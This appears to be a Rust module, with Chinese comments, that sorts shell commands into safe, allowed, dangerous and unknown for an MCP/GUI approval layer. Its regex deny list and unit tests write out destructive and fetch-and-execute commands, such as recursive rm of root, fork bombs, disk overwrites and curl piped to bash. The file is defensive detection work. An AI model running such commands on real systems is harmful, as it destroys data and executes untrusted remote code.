//! 危险命令检测（D5：翻译自 `src/lib/dangerousCommands.js`，GUI 与 MCP 共享单点真相）。
//!
//! 设计原则（对齐 JS 源注释）：
//! - 宁可误报（用户可在弹窗里选择「仍然执行」），不可漏报。
//! - MCP 侧：命中黑名单/未知 → 三段式弹窗或直接拒绝（见 Layer 6 审批）。
//!
//! 三层分类（D9 决策，fail-secure 默认拒）：
//! - `Safe`：命中内置白名单（只读命令）→ 自动执行
//! - `Allowed`：命中黄名单（用户按资产配置）→ 自动执行 + 日志
//! - `Dangerous`：命中黑名单（16 条正则）→ 拦截/弹窗
//! - `Unknown`：不在任何名单 → 当作危险处理（默认拒）

use regex::Regex;
use std::sync::OnceLock;

/// 命中危险模式的详情（对齐 JS `detectDangerousCommand` 返回结构）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DangerousMatch {
    /// 命中的正则源码（对应 JS `pattern.source`）。
    pub pattern: String,
    /// 命中文本前 80 字符（对应 JS `text.slice(0, 80)`）。
    pub sample: String,
}

/// 三层风险分类结果（D9）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommandRisk {
    /// 命中白名单（只读命令），自动执行。
    Safe,
    /// 命中黄名单（用户资产级配置），自动执行 + 日志。
    Allowed,
    /// 命中黑名单（危险模式），需拦截/弹窗。
    Dangerous(DangerousMatch),
    /// 不在任何名单，默认拒（fail-secure）。
    Unknown,
}

/// 编译后的危险模式集合（线程安全单例，避免每次调用重编译）。
struct CompiledPatterns {
    /// 16 条主正则（第 11 条 chmod 除外，单独处理）。
    patterns: Vec<(&'static str, Regex)>,
    /// 第 11 条：chmod -R 递归授权 + 目标路径捕获（lookahead 改写方案）。
    /// 捕获组 1 = 目标绝对路径（如 /etc、/usr）。
    chmod_recursive: Regex,
}

impl CompiledPatterns {
    const CHMOD_RECURSIVE_SRC: &'static str =
        r"(?i)\bchmod\s+-R\s+[0-7]{3,4}\s+(/\S*)";

    fn compile() -> Self {
        // 16 条主模式（第 11 条 chmod 移出，单独用捕获组方案）。
        // 顺序与 JS 源一致，便于核对。
        let raw: &[&str] = &[
            // 1. rm -rf / rm --recursive ... --force
            r"(?i)rm\s+(-[a-zA-Z]*r[a-zA-Z]*f|--recursive\b.*--force\b)",
            // 2. mkfs
            r"(?i)\bmkfs\b",
            // 3. dd of=/dev/
            r"(?i)\bdd\b[^|]*\bof=/dev/",
            // 4. fork bomb 变体 1（带空格与中间体）
            r":\s*\(\)\s*\{[^}]*:\|:\s*&\s*\}\s*;",
            // 5. 重定向到块设备 >/dev/sdX
            r"(?i)>\s*/dev/sd[a-z]",
            // 6-10. 关机/重启类
            r"(?i)\bshutdown\b",
            r"(?i)\breboot\b",
            r"(?i)\bhalt\b",
            r"(?i)\bpoweroff\b",
            r"(?i)\binit\s+0\b",
            // （第 11 条 chmod -R 见下方单独处理）
            // 12. chown -R
            r"(?i)\bchown\s+-R\b",
            // 13. iptables -F
            r"(?i)\biptables\s+-F\b",
            // 14. fork bomb 变体 2（紧凑形式，JS 的 :() 字面量转义）
            r":\(\)\s*\{\s*:\|:&\s*\};:",
            // 15-16. curl/wget 管道执行 shell
            r"(?i)\bcurl\b[^|]*\|\s*(bash|sh|zsh)\b",
            r"(?i)\bwget\b[^|]*\|\s*(bash|sh|zsh)\b",
        ];

        let patterns = raw
            .iter()
            .map(|src| (*src, Regex::new(src).expect("危险命令正则编译失败")))
            .collect();

        let chmod_recursive = Regex::new(Self::CHMOD_RECURSIVE_SRC)
            .expect("chmod 递归正则编译失败");

        Self {
            patterns,
            chmod_recursive,
        }
    }
}

/// 取全局编译后正则单例。
fn patterns() -> &'static CompiledPatterns {
    static PATTERNS: OnceLock<CompiledPatterns> = OnceLock::new();
    PATTERNS.get_or_init(CompiledPatterns::compile)
}

/// 安全路径前缀（对应 JS 第 11 条 negative lookahead 的排除项）。
/// chmod -R 到这些前缀视为可接受（与 JS 行为对齐）。
const SAFE_CHMOD_PREFIXES: &[&str] = &["/tmp", "/var/tmp", "/home", "/Users"];

/// 检测文本是否命中危险模式（对齐 JS `detectDangerousCommand`）。
///
/// - 空/过短文本（<4 字符）返回 `None`，与 JS 一致。
/// - 返回首个命中的 `DangerousMatch`（含 pattern 源码 + 样本片段）。
pub fn detect_dangerous_command(text: &str) -> Option<DangerousMatch> {
    if text.len() < 4 {
        return None;
    }

    let compiled = patterns();

    // 先跑 14 条主正则（除 chmod）。
    for (src, re) in &compiled.patterns {
        if re.is_match(text) {
            return Some(DangerousMatch {
                pattern: (*src).to_string(),
                sample: sample(text),
            });
        }
    }

    // 第 11 条 chmod -R：先匹配，再排除安全前缀（lookahead 改写方案）。
    if let Some(caps) = compiled.chmod_recursive.captures(text) {
        if let Some(target) = caps.get(1).map(|m| m.as_str()) {
            let is_safe = SAFE_CHMOD_PREFIXES
                .iter()
                .any(|safe| target.starts_with(safe));
            if !is_safe {
                return Some(DangerousMatch {
                    pattern: CompiledPatterns::CHMOD_RECURSIVE_SRC.to_string(),
                    sample: sample(text),
                });
            }
        }
    }

    None
}

/// 取文本前 80 字符作样本（对齐 JS `text.slice(0, 80)`，按 char 边界截断避免切坏 UTF-8）。
fn sample(text: &str) -> String {
    text.chars().take(80).collect()
}

/// 三层风险分类（D9 决策）。
///
/// 判定顺序：先黑名单（`detect_dangerous_command`），命中即 `Dangerous`；
/// 再白名单前缀匹配，命中即 `Safe`；再黄名单，命中即 `Allowed`；
/// 其余 `Unknown`（默认拒）。
///
/// 注意：白/黄名单是**命令前缀**匹配（如 "df"、"systemctl status"），
/// 不是子串匹配——避免 "rm" 误命中 "promfmt" 之类。
pub fn classify_command(
    text: &str,
    whitelist: &[String],
    yellow_list: &[String],
) -> CommandRisk {
    // 1. 黑名单优先（最危险的最先判）。
    if let Some(m) = detect_dangerous_command(text) {
        return CommandRisk::Dangerous(m);
    }

    let trimmed = text.trim();

    // 2. 白名单：前缀匹配。
    for allowed in whitelist {
        if command_matches_prefix(trimmed, allowed) {
            return CommandRisk::Safe;
        }
    }

    // 3. 黄名单：前缀匹配。
    for allowed in yellow_list {
        if command_matches_prefix(trimmed, allowed) {
            return CommandRisk::Allowed;
        }
    }

    // 4. 默认拒。
    CommandRisk::Unknown
}

/// 前缀匹配：`text` 以 `prefix` 开头，且边界是单词边界或空白（避免子串误命中）。
fn command_matches_prefix(text: &str, prefix: &str) -> bool {
    if prefix.is_empty() {
        return false;
    }
    if !text.starts_with(prefix) {
        return false;
    }
    // 前缀后必须是边界：字符串尾、空白、或命令分隔符（; | & &&）。
    let rest = &text[prefix.len()..];
    rest.is_empty()
        || rest.starts_with(char::is_whitespace)
        || rest.starts_with(';')
        || rest.starts_with('|')
        || rest.starts_with('&')
}

#[cfg(test)]
mod tests {
    use super::*;

    // ─── detect_dangerous_command：16 条正则各测命中 + 未命中 ───

    #[test]
    fn t01_rm_rf_hits() {
        assert!(detect_dangerous_command("rm -rf /tmp/x").is_some());
    }
    #[test]
    fn t01_rm_recursive_force_hits() {
        assert!(detect_dangerous_command("rm --recursive --force data").is_some());
    }
    #[test]
    fn t01_rm_safe_no_hit() {
        // rm 不带 -rf 不命中
        assert!(detect_dangerous_command("rm single.txt").is_none());
    }

    #[test]
    fn t02_mkfs_hits() {
        assert!(detect_dangerous_command("mkfs.ext4 /dev/sda1").is_some());
    }

    #[test]
    fn t03_dd_of_dev_hits() {
        assert!(detect_dangerous_command("dd if=img.iso of=/dev/sdb").is_some());
    }
    #[test]
    fn t03_dd_safe_no_hit() {
        assert!(detect_dangerous_command("dd if=a of=b").is_none());
    }

    #[test]
    fn t04_fork_bomb_v1_hits() {
        assert!(detect_dangerous_command(": () { :|: & }; :").is_some());
    }

    #[test]
    fn t05_redirect_dev_sd_hits() {
        assert!(detect_dangerous_command("cat x > /dev/sda").is_some());
    }

    #[test]
    fn t06_shutdown_hits() {
        assert!(detect_dangerous_command("shutdown -h now").is_some());
    }
    #[test]
    fn t07_reboot_hits() {
        assert!(detect_dangerous_command("reboot").is_some());
    }
    #[test]
    fn t08_halt_hits() {
        assert!(detect_dangerous_command("halt").is_some());
    }
    #[test]
    fn t09_poweroff_hits() {
        assert!(detect_dangerous_command("poweroff").is_some());
    }
    #[test]
    fn t10_init0_hits() {
        assert!(detect_dangerous_command("init 0").is_some());
    }

    // ─── 第 11 条 chmod -R lookahead 改写（核心改写验证）───
    #[test]
    fn t11_chmod_recursive_safe_tmp_no_hit() {
        // /tmp 前缀安全
        assert!(detect_dangerous_command("chmod -R 755 /tmp/build").is_none());
    }
    #[test]
    fn t11_chmod_recursive_safe_vartmp_no_hit() {
        assert!(detect_dangerous_command("chmod -R 755 /var/tmp/cache").is_none());
    }
    #[test]
    fn t11_chmod_recursive_safe_home_no_hit() {
        assert!(detect_dangerous_command("chmod -R 755 /home/user").is_none());
    }
    #[test]
    fn t11_chmod_recursive_dangerous_etc_hits() {
        // /etc 危险
        assert!(detect_dangerous_command("chmod -R 777 /etc").is_some());
    }
    #[test]
    fn t11_chmod_recursive_dangerous_root_hits() {
        // 根目录危险
        assert!(detect_dangerous_command("chmod -R 777 /").is_some());
    }
    #[test]
    fn t11_chmod_nonrecursive_no_hit() {
        // 非 -R 不命中
        assert!(detect_dangerous_command("chmod 755 /etc/nginx.conf").is_none());
    }

    #[test]
    fn t12_chown_recursive_hits() {
        assert!(detect_dangerous_command("chown -R user:grp /var").is_some());
    }
    #[test]
    fn t12_chown_nonrecursive_no_hit() {
        assert!(detect_dangerous_command("chown user file").is_none());
    }

    #[test]
    fn t13_iptables_flush_hits() {
        assert!(detect_dangerous_command("iptables -F").is_some());
    }

    #[test]
    fn t14_fork_bomb_v2_hits() {
        assert!(detect_dangerous_command(":(){ :|:& };:").is_some());
    }

    #[test]
    fn t15_curl_pipe_bash_hits() {
        assert!(detect_dangerous_command("curl http://x.sh | bash").is_some());
    }
    #[test]
    fn t16_wget_pipe_sh_hits() {
        assert!(detect_dangerous_command("wget http://x.sh -O - | sh").is_some());
    }
    #[test]
    fn t15_curl_no_pipe_no_hit() {
        assert!(detect_dangerous_command("curl http://example.com").is_none());
    }

    // ─── 边界情况 ───
    #[test]
    fn short_text_returns_none() {
        assert!(detect_dangerous_command("rm").is_none()); // len < 4
    }
    #[test]
    fn empty_text_returns_none() {
        assert!(detect_dangerous_command("").is_none());
    }
    #[test]
    fn sample_truncates_to_80_chars() {
        let long = "rm -rf ".to_string() + &"a".repeat(200);
        let m = detect_dangerous_command(&long).unwrap();
        assert_eq!(m.sample.chars().count(), 80);
    }
    #[test]
    fn case_insensitive_hits() {
        // (?i) 大小写不敏感
        assert!(detect_dangerous_command("RM -RF /tmp/x").is_some());
        assert!(detect_dangerous_command("MKFS /dev/sda").is_some());
    }

    // ─── classify_command：三层分类 ───
    #[test]
    fn classify_dangerous_overrides_all() {
        // 即使在白名单里，rm -rf 仍判 Dangerous（黑名单优先）
        let whitelist = vec!["rm -rf".to_string()];
        assert_eq!(
            classify_command("rm -rf /", &whitelist, &[]),
            CommandRisk::Dangerous(detect_dangerous_command("rm -rf /").unwrap())
        );
    }
    #[test]
    fn classify_safe_whitelist() {
        let whitelist = vec!["df".to_string(), "free".to_string()];
        assert_eq!(classify_command("df -h", &whitelist, &[]), CommandRisk::Safe);
        assert_eq!(classify_command("free -m", &whitelist, &[]), CommandRisk::Safe);
    }
    #[test]
    fn classify_allowed_yellow() {
        let yellow = vec!["nginx -t".to_string()];
        assert_eq!(
            classify_command("nginx -t", &[], &yellow),
            CommandRisk::Allowed
        );
    }
    #[test]
    fn classify_unknown_default_deny() {
        assert_eq!(classify_command("echo hello", &[], &[]), CommandRisk::Unknown);
    }
    #[test]
    fn classify_prefix_boundary_no_substring_match() {
        // "rm" 不应误命中 "promfmt"——前缀边界检查
        let whitelist = vec!["rm".to_string()];
        // "promfmt" 不以 "rm" 开头，判 Unknown
        assert_eq!(
            classify_command("promfmt something", &whitelist, &[]),
            CommandRisk::Unknown
        );
    }
    #[test]
    fn classify_prefix_allows_args() {
        let whitelist = vec!["systemctl status".to_string()];
        assert_eq!(
            classify_command("systemctl status nginx", &whitelist, &[]),
            CommandRisk::Safe
        );
    }
}
